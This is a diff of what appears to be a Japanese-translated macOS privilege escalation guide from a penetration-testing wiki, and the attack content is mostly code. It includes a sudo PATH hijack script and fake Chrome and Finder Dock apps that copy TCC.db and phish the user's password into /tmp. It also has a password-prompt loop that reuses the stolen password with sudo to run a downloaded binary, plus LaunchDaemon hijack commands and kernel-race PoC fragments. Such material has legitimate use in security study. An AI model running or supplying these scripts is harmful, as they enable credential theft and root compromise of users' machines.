@@ -4,7 +4,7 @@
 
 ## TCC Privilege Escalation
 
-TCC privilege escalation をお探しであれば、次へ移動してください:
+TCC privilege escalation を探してここに来た場合は、次を参照してください：
 
 
 {{#ref}}
@@ -13,45 +13,48 @@ macos-security-protections/macos-tcc/
 
 ## Linux Privesc
 
-ご注意ください: **most of the tricks about privilege escalation affecting Linux/Unix will affect also MacOS** machines. なので、以下を参照してください:
+ご注意：**most of the tricks about privilege escalation affecting Linux/Unix will affect also MacOS** machines。したがって、次を参照してください：
 
 
 {{#ref}}
 ../../linux-hardening/privilege-escalation/
 {{#endref}}
 
-## User Interaction
+## ユーザーインタラクション
 
 ### Sudo Hijacking
 
-オリジナルは [Sudo Hijacking technique inside the Linux Privilege Escalation post](../../linux-hardening/privilege-escalation/index.html#sudo-hijacking) で見つけることができます。
+オリジナルは[Sudo Hijacking technique inside the Linux Privilege Escalation post](../../linux-hardening/privilege-escalation/index.html#sudo-hijacking)で確認できます。
 
-ただし、macOS はユーザーが **`sudo`** を実行したときにユーザーの **`PATH`** を **維持します**。つまり、この攻撃を達成する別の方法は、被害者が **running sudo** の際に実行する他のバイナリを **hijack other binaries** することです:
+しかし、macOS はユーザーが **`sudo`** を実行したときにユーザーの **`PATH`** を **保持します**。つまり、この攻撃を成功させる別の方法は、被害者が **running sudo** 時に実行するバイナリを **hijack other binaries** することです：
 ```bash
 # Let's hijack ls in /opt/homebrew/bin, as this is usually already in the users PATH
-cat > /opt/homebrew/bin/ls <<EOF
+cat > /opt/homebrew/bin/ls <<'EOF'
 #!/bin/bash
-if [ "\$(id -u)" -eq 0 ]; then
+if [ "$(id -u)" -eq 0 ]; then
 whoami > /tmp/privesc
 fi
-/bin/ls "\$@"
+/bin/ls "$@"
 EOF
 chmod +x /opt/homebrew/bin/ls
 
 # victim
 sudo ls
 ```
-Note that a user that uses the terminal will highly probable have **Homebrew installed**. So it's possible to hijack binaries in **`/opt/homebrew/bin`**.
+ターミナルを使用するユーザーは高い確率で **Homebrew がインストールされています**。そのため、**`/opt/homebrew/bin`** のバイナリをハイジャックすることが可能です。
 
 ### Dock Impersonation
 
-いくつかの **social engineering** を用いることで、Dock 内で例えば **Google Chrome を偽装** し、実際に自分のスクリプトを実行させることができます:
+いくつかの **social engineering** を用いて、Dock 内で例えば **impersonate for example Google Chrome** を装い、実際に自分のスクリプトを実行させることができます:
 
 {{#tabs}}
 {{#tab name="Chrome Impersonation"}}
-いくつかの提案:
+いくつかの提案：
 
-- Dock を確認して Chrome があるかどうか調べ、ある場合はそのエントリを**削除**し、Dock 配列の同じ位置に**偽の Chrome エントリを追加**します。
+- Dock に Chrome があるか確認し、ある場合はそのエントリを**削除**し、Dock 配列の同じ位置に**偽の** **Chrome エントリを追加**します。
+
+<details>
+<summary>Chrome Dock impersonation script</summary>
 ```bash
 #!/bin/sh
 
@@ -65,7 +68,7 @@ mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
 mkdir -p /tmp/Google\ Chrome.app/Contents/Resources
 
 # Payload to execute
-cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<EOF
+cat > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c <<'EOF'
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
@@ -74,8 +77,8 @@ int main() {
 char *cmd = "open /Applications/Google\\\\ Chrome.app & "
 "sleep 2; "
 "osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
-"PASSWORD=\$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
-"echo \$PASSWORD > /tmp/passwd.txt";
+"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Enter your password to update Google Chrome:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"Applications:Google Chrome.app:Contents:Resources:app.icns\")' -e 'end tell' -e 'return userPassword'); "
+"echo $PASSWORD > /tmp/passwd.txt";
 system(cmd);
 return 0;
 }
@@ -87,7 +90,7 @@ rm -rf /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome.c
 chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome
 
 # Info.plist
-cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
+cat << 'EOF' > /tmp/Google\ Chrome.app/Contents/Info.plist
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
 "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
@@ -121,16 +124,21 @@ defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</
 sleep 0.1
 killall Dock
 ```
+</details>
+
 {{#endtab}}
 
 {{#tab name="Finder Impersonation"}}
-いくつかの提案:
+いくつかの提案：
 
-- あなたは**FinderをDockから削除できません**。したがってDockに追加するなら、偽のFinderを本物のすぐ隣に置くことができます。そのためには、Dock配列の先頭に偽のFinderエントリを**追加する必要があります**。
-- もう一つの選択肢はDockに置かずに単に開くことです。"Finder asking to control Finder" はそれほど不自然ではありません。
-- もう一つの方法は、ひどいダイアログでパスワードを要求することなく**escalate to root without asking**することで、Finderに特権操作を実行するために実際にパスワードを尋ねさせることです:
-- Finderに**`/etc/pam.d`**へ新しい**`sudo`**ファイルをコピーさせる（パスワード入力を求めるプロンプトには "Finder wants to copy sudo" と表示されます）
-- Finderに新しい**Authorization Plugin**をコピーさせる（ファイル名を制御すれば、パスワード入力プロンプトに "Finder wants to copy Finder.bundle" と表示されます）
+- **Finder を Dock から削除できません**。なので Dock に追加する場合は、偽の Finder を本物の隣に置くと良いです。これには **Dock 配列の先頭に偽の Finder エントリを追加する**必要があります。
+- 別の選択肢として、Dock に配置せずに単に開くだけにする方法もあります。「Finder が Finder を制御しようとしています」と表示されてもそれほど不自然ではありません。
+- 醜いダイアログでパスワードを尋ねることなく、**escalate to root without asking** する別の方法は、Finder に実際に権限が必要な操作を行わせてパスワードを尋ねさせることです：
+- Finder に **`/etc/pam.d`** に新しい **`sudo`** ファイルをコピーさせる（パスワードを要求するプロンプトには "Finder wants to copy sudo" と表示されます）
+- Finder に新しい **Authorization Plugin** をコピーさせる（ファイル名を制御できれば、パスワード要求のプロンプトに "Finder wants to copy Finder.bundle" と表示されます）
+
+<details>
+<summary>Finder Dock impersonation script</summary>
 ```bash
 #!/bin/sh
 
@@ -144,7 +152,7 @@ mkdir -p /tmp/Finder.app/Contents/MacOS
 mkdir -p /tmp/Finder.app/Contents/Resources
 
 # Payload to execute
-cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<EOF
+cat > /tmp/Finder.app/Contents/MacOS/Finder.c <<'EOF'
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
@@ -153,8 +161,8 @@ int main() {
 char *cmd = "open /System/Library/CoreServices/Finder.app & "
 "sleep 2; "
 "osascript -e 'tell application \"Finder\"' -e 'set homeFolder to path to home folder as string' -e 'set sourceFile to POSIX file \"/Library/Application Support/com.apple.TCC/TCC.db\" as alias' -e 'set targetFolder to POSIX file \"/tmp\" as alias' -e 'duplicate file sourceFile to targetFolder with replacing' -e 'end tell'; "
-"PASSWORD=\$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
-"echo \$PASSWORD > /tmp/passwd.txt";
+"PASSWORD=$(osascript -e 'Tell application \"Finder\"' -e 'Activate' -e 'set userPassword to text returned of (display dialog \"Finder needs to update some components. Enter your password:\" default answer \"\" with hidden answer buttons {\"OK\"} default button 1 with icon file \"System:Library:CoreServices:Finder.app:Contents:Resources:Finder.icns\")' -e 'end tell' -e 'return userPassword'); "
+"echo $PASSWORD > /tmp/passwd.txt";
 system(cmd);
 return 0;
 }
@@ -166,7 +174,7 @@ rm -rf /tmp/Finder.app/Contents/MacOS/Finder.c
 chmod +x /tmp/Finder.app/Contents/MacOS/Finder
 
 # Info.plist
-cat << EOF > /tmp/Finder.app/Contents/Info.plist
+cat << 'EOF' > /tmp/Finder.app/Contents/Info.plist
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
 "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
@@ -200,18 +208,20 @@ defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</
 sleep 0.1
 killall Dock
 ```
+</details>
+
 {{#endtab}}
 {{#endtabs}}
 
 ### Password prompt phishing + sudo reuse
 
-マルウェアはしばしばユーザーの操作を悪用して、**sudoが使えるパスワードを取得**し、それをプログラム的に再利用します。一般的なフロー:
+マルウェアは頻繁にユーザーの操作を悪用して **sudo対応のパスワードを取得** し、プログラム的に再利用します。一般的なフロー:
 
-1. ログイン中のユーザを `whoami` で特定する。
-2. **パスワード入力プロンプトを繰り返し表示**して、`dscl . -authonly "$user" "$pw"` が成功するまで。
-3. 認証情報をキャッシュ（例: `/tmp/.pass`）し、`sudo -S`（標準入力経由でパスワード）で特権操作を実行する。
+1. `whoami` でログイン中のユーザを特定する。
+2. **パスワードプロンプトをループ** し、`dscl . -authonly "$user" "$pw"` が成功するまで繰り返す。
+3. 資格情報をキャッシュする（例: `/tmp/.pass`）し、`sudo -S`（password over stdin）で特権操作を実行する。
 
-最小限のチェーンの例:
+最小のチェーン例:
 ```bash
 user=$(whoami)
 while true; do
@@ -222,14 +232,77 @@ printf '%s\n' "$pw" > /tmp/.pass
 curl -o /tmp/update https://example.com/update
 printf '%s\n' "$pw" | sudo -S xattr -c /tmp/update && chmod +x /tmp/update && /tmp/update
 ```
-盗まれたパスワードはその後再利用され、**`xattr -c`で Gatekeeper の検疫を解除したり**、LaunchDaemons やその他の特権ファイルをコピーしたり、追加のステージを非対話的に実行したりできます。
+盗まれたパスワードはその後再利用でき、**`xattr -c`でGatekeeperの隔離を解除したり**、LaunchDaemonsやその他の特権ファイルをコピーしたり、追加のステージを非対話的に実行したりできます。
 
-## TCC - Root 権限昇格
+## Newer macOS-specific vectors (2023–2025)
 
-### CVE-2020-9771 - mount_apfs TCC バイパスと権限昇格
+### Deprecated `AuthorizationExecuteWithPrivileges` still usable
 
-**任意のユーザー**（権限のないユーザーでも）は time machine のスナップショットを作成してマウントし、そのスナップショットの**全てのファイルにアクセス**できます。\
-必要な**唯一の特権**は、使用するアプリ（`Terminal`など）に**Full Disk Access** (FDA)（`kTCCServiceSystemPolicyAllfiles`）が与えられていることだけで、これは管理者によって付与される必要があります。
+`AuthorizationExecuteWithPrivileges` は 10.7 で非推奨になりましたが、**Sonoma/Sequoia ではまだ動作します**。多くの商用アップデータは `/usr/libexec/security_authtrampoline` を信頼されていないパスで呼び出します。対象バイナリがユーザー書き込み可能であれば、trojanを植え付けて正当なプロンプトに便乗できます:
+```bash
+# find vulnerable helper calls
+log stream --info --predicate 'eventMessage CONTAINS "security_authtrampoline"'
+
+# replace expected helper
+cp /tmp/payload /Users/me/Library/Application\ Support/Target/helper
+chmod +x /Users/me/Library/Application\ Support/Target/helper
+# when the app updates, the root prompt spawns your payload
+```
+Combine with the **masquerading tricks above** to present a believable password dialog.
+
+### LaunchDaemon plist hijack (CVE-2025-24085 pattern)
+
+LaunchDaemon plist またはその `ProgramArguments` ターゲットが **user-writable** の場合、それを差し替えてから launchd に再読み込みを強制することで権限昇格できます:
+```bash
+sudo launchctl bootout system /Library/LaunchDaemons/com.apple.securemonitor.plist
+cp /tmp/root.sh /Library/PrivilegedHelperTools/securemonitor
+chmod 755 /Library/PrivilegedHelperTools/securemonitor
+cat > /Library/LaunchDaemons/com.apple.securemonitor.plist <<'PLIST'
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0"><dict>
+<key>Label</key><string>com.apple.securemonitor</string>
+<key>ProgramArguments</key>
+<array><string>/Library/PrivilegedHelperTools/securemonitor</string></array>
+<key>RunAtLoad</key><true/>
+</dict></plist>
+PLIST
+sudo launchctl bootstrap system /Library/LaunchDaemons/com.apple.securemonitor.plist
+```
+これは **CVE-2025-24085** に公開されたエクスプロイトパターンを反映しており、書き込み可能なplistが悪用されて攻撃者のコードがrootで実行された。
+
+### XNU SMR credential race (CVE-2025-24118)
+
+`kauth_cred_proc_update` 内のレースにより、ローカル攻撃者が読み取り専用の資格情報ポインタ（`proc_ro.p_ucred`）を破損させることができる。`setgid()`/`getgid()` のループをスレッド間で競合させ、不整合な `memcpy` が発生するまで続ける。破損に成功すると **uid 0** とカーネルメモリへのアクセスを得る。最小限のPoC構成:
+```c
+// thread A
+while (1) setgid(rand());
+// thread B
+while (1) getgid();
+```
+heap grooming と組み合わせて、pointer re-reads が発生する場所に制御されたデータを配置する。脆弱なビルドでは、これは SIP バイパスを必要としない信頼できる **local kernel privesc** です。
+
+### SIP バイパス via Migration assistant ("Migraine", CVE-2023-32369)
+
+既に root を取得している場合でも、SIP はシステム領域への書き込みをブロックします。**Migraine** バグは Migration Assistant の entitlement `com.apple.rootless.install.heritable` を濫用して、SIP バイパスを継承する子プロセスを生成し、保護されたパス（例: `/System/Library/LaunchDaemons`）を上書きします。チェーン:
+
+1. ライブシステム上で root を取得する。
+2. `systemmigrationd` を細工した状態でトリガーして、攻撃者制御のバイナリを実行させる。
+3. 継承された entitlement を使って SIP 保護ファイルをパッチし、再起動後も永続化させる。
+
+### NSPredicate/XPC expression smuggling (CVE-2023-23530/23531 bug class)
+
+複数の Apple デーモンが XPC 経由で **NSPredicate** オブジェクトを受け取り、攻撃者が制御できる `expressionType` フィールドのみを検証します。任意の selector を評価するような predicate を構築することで、（例: `coreduetd`, `contextstored`）での **code execution in root/system XPC services** を達成できます。初期の app sandbox escape と組み合わせると、**privilege escalation without user prompts** を実現します。predicate をデシリアライズし、適切な visitor を持たない XPC エンドポイントを探してください。
+
+## TCC - Root Privilege Escalation
+
+### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation
+
+**Any user**（非特権ユーザでも）は Time Machine スナップショットを作成・マウントして、そのスナップショット内のファイルを **access ALL the files** できます.\
+必要な **only privileged** は、使用するアプリケーション（例: `Terminal`）が **Full Disk Access**（FDA）アクセス（`kTCCServiceSystemPolicyAllfiles`）を持っていることで、これは管理者によって付与される必要があります。
+
+<details>
+<summary>Time Machine スナップショットのマウント</summary>
 ```bash
 # Create snapshot
 tmutil localsnapshot
@@ -249,19 +322,21 @@ mkdir /tmp/snap
 # Access it
 ls /tmp/snap/Users/admin_user # This will work
 ```
-詳しい説明は [**found in the original report**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**
+</details>
+
+より詳しい説明は[**found in the original report**](https://theevilbit.github.io/posts/cve_2020_9771/)**。
 
 ## 機密情報
 
-これは escalate privileges に役立ちます:
-
+これは権限昇格に役立つ可能性があります:
 
 {{#ref}}
 macos-files-folders-and-binaries/macos-sensitive-locations.md
 {{#endref}}
 
-## 参考文献
+## 参考
 
-- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
+- [Microsoft "Migraine" SIP bypass (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
+- [CVE-2025-24118 SMR credential race write-up & PoC](https://github.com/jprx/CVE-2025-24118)
 
 {{#include ../../banners/hacktricks-training.md}}
